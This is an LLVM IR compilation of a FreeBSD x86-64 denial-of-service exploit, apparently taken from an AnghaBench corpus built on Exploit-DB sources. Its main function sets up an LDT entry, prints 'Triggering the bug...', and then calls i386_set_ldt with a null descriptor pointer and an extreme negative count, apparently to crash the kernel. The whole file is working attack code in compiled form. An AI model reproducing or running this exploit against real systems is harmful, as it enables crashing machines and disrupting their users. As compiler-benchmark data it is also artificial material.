; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd_x86-64/dos/extr_39570.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd_x86-64/dos/extr_39570.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.segment_descriptor = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%union.descriptor = type { i32 }

@SDT_MEMRW = common dso_local global i32 0, align 4
@SEL_UPL = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [51 x i8] c"[+] Adding an initial entry to the process LDT...\0A\00", align 1
@LDT_AUTO_ALLOC = common dso_local global i32 0, align 4
@EX_OSERR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"i386_set_ldt(LDT_AUTO_ALLOC)\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"returned index: %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"Triggering the bug...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.segment_descriptor, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 0
  store i32 0, i32* %8, align 4
  %9 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 1
  store i32 0, i32* %9, align 4
  %10 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 2
  %11 = load i32, i32* @SDT_MEMRW, align 4
  store i32 %11, i32* %10, align 4
  %12 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 3
  %13 = load i32, i32* @SEL_UPL, align 4
  store i32 %13, i32* %12, align 4
  %14 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 4
  store i32 1, i32* %14, align 4
  %15 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 5
  store i32 0, i32* %15, align 4
  %16 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 6
  store i32 0, i32* %16, align 4
  %17 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 7
  store i32 1, i32* %17, align 4
  %18 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 8
  store i32 0, i32* %18, align 4
  %19 = getelementptr inbounds %struct.segment_descriptor, %struct.segment_descriptor* %7, i32 0, i32 9
  store i32 0, i32* %19, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str, i64 0, i64 0))
  %21 = load i32, i32* @LDT_AUTO_ALLOC, align 4
  %22 = bitcast %struct.segment_descriptor* %7 to %union.descriptor*
  %23 = call i32 @i386_set_ldt(i32 %21, %union.descriptor* %22, i32 1)
  store i32 %23, i32* %6, align 4
  %24 = load i32, i32* %6, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %2
  %27 = load i32, i32* @EX_OSERR, align 4
  %28 = call i32 @err(i32 %27, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  br label %29

29:                                               ; preds = %26, %2
  %30 = load i32, i32* %6, align 4
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i32 %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %33 = call i32 @i386_set_ldt(i32 1, %union.descriptor* null, i32 -2147483648)
  store i32 %33, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  ret i32 %34
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @i386_set_ldt(i32, %union.descriptor*, i32) #1

declare dso_local i32 @err(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
